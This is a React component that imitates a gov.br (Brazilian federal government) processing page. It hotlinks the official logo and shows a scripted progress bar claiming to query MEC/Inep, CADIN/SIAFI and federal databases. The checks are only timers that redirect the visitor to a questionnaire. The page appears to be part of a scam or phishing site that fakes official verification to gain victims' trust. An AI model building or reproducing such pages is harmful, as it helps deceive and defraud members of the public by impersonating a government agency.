import { useEffect, useRef, useState } from 'react'
import { useNavigate } from 'react-router-dom'
import GovFooter from '../components/gov/GovFooter.jsx'

const GOV_LOGO = 'https://www.gov.br/++theme++padrao_govbr/img/govbr-colorido-b.png'

const STEPS = [
  { t: 'Sincronizando com Servidores MEC/Inep', p: 15 },
  { t: 'Consultando restrições cadastrais (CADIN/SIAFI)', p: 30 },
  { t: 'Verificando saldo de dotação orçamentária (Projeto PRG-2026)', p: 45 },
  { t: 'Cruzando dados Censo Escolar com Bases Federais', p: 65 },
  { t: 'Validando Vínculo em Rede Pública', p: 85 },
  { t: 'Gerando Certificado de Aptidão e Homologação', p: 100 },
]

export default function ValidacaoEmAndamento() {
  const navigate = useNavigate()
  const [active, setActive] = useState(0)
  const [progress, setProgress] = useState(5)
  const protocolRef = useRef(
    localStorage.getItem('protocol_id') || 'AUT-MEC-VALIDATION'
  )

  useEffect(() => {
    document.body.classList.add('gov-body')
    return () => document.body.classList.remove('gov-body')
  }, [])

  useEffect(() => {
    let idx = 0
    const tick = () => {
      if (idx >= STEPS.length) {
        setTimeout(() => navigate('/questionario'), 1000)
        return
      }
      setActive(idx + 1)
      setProgress(STEPS[idx].p)
      idx++
      timerId = setTimeout(tick, 1500)
    }
    let timerId = setTimeout(tick, 500)
    return () => clearTimeout(timerId)
  }, [navigate])

  return (
    <div
      style={{
        minHeight: '100vh',
        display: 'flex',
        flexDirection: 'column',
        background: '#f2f5f7',
      }}
    >
      <div
        style={{
          flex: 1,
          display: 'flex',
          alignItems: 'center',
          justifyContent: 'center',
          padding: 20,
        }}
      >
        <div
          style={{
            maxWidth: 500,
            width: '100%',
            background: 'white',
            borderRadius: 8,
            padding: 40,
            boxShadow: '0 4px 6px -1px rgba(0, 0, 0, 0.1)',
            borderTop: '4px solid #1351b4',
            textAlign: 'center',
            boxSizing: 'border-box',
          }}
        >
          <div className="flex justify-center mb-6">
            <img src={GOV_LOGO} alt="gov.br" style={{ height: 30 }} />
          </div>

          <h2 className="text-xl font-black text-blue-900 mb-2 uppercase tracking-tight">
            Processamento Digital
          </h2>
          <p className="text-xs text-gray-500 font-bold">
            Protocolo: <span>{protocolRef.current}</span>
          </p>

          <div style={{ margin: '30px 0' }}>
            <div
              style={{
                height: 8,
                background: '#e2e8f0',
                borderRadius: 10,
                overflow: 'hidden',
              }}
            >
              <div
                style={{
                  height: '100%',
                  background: '#1351b4',
                  width: `${progress}%`,
                  transition: 'width 0.5s',
                }}
              />
            </div>
          </div>

          <div
            className="text-left"
            style={{
              marginTop: 25,
              borderTop: '1px solid #edf2f7',
              paddingTop: 20,
            }}
          >
            {STEPS.slice(0, active).map((s, i) => {
              const isDone = i < active - 1
              return (
                <div
                  key={s.t}
                  style={{
                    fontSize: 11,
                    marginBottom: 12,
                    display: 'flex',
                    alignItems: 'center',
                    gap: 10,
                    color: isDone ? '#059669' : '#64748b',
                    fontWeight: 700,
                    textTransform: 'uppercase',
                    transition: 'all 0.3s',
                  }}
                >
                  <div
                    style={{
                      width: 6,
                      height: 6,
                      background: isDone ? '#059669' : '#cbd5e1',
                      borderRadius: '50%',
                      boxShadow: isDone
                        ? '0 0 8px rgba(5, 150, 105, 0.4)'
                        : 'none',
                    }}
                  />
                  <span>{s.t}...</span>
                </div>
              )
            })}
          </div>
        </div>
      </div>

      <GovFooter logo={GOV_LOGO} />
    </div>
  )
}
